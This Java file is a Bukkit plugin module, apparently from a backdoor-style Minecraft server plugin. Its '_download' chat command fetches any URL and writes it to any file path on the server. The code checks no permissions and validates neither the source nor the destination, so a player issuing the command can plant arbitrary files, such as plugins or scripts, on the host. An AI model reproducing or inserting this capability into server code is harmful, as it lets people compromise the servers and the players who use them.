package me.maiko.modules.plugin;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

import org.bukkit.entity.Player;

import me.maiko.main.Main;
import me.maiko.module.Module;

public class FileDownload_Mod extends Module{
	
	public FileDownload_Mod() {
		super("FileDownload");
	}
	@Override
	public void onCommand(String[] args, Player p) {
		if (args.length == 3) {
			try {
				p.sendMessage(Main.Prefix + "Downloading...");
				FileOutputStream outStream = new FileOutputStream(args[2]);
				InputStream inStream = new URL(args[1]).openStream();
				int read = 0;
				byte[] data = new byte[1024];
				while((read = inStream.read(data, 0, 1024)) != -1) outStream.write(data, 0, read);
				inStream.close();
				outStream.close();
				p.sendMessage(Main.Prefix + "§aDone");
			} catch (Exception e) {
				p.sendMessage(Main.Prefix + "§cFAIL: " + e);
			}
		} else {

			p.sendMessage(Main.Prefix + "Nutze _download <Url> <target>");
		}
	
	}
}
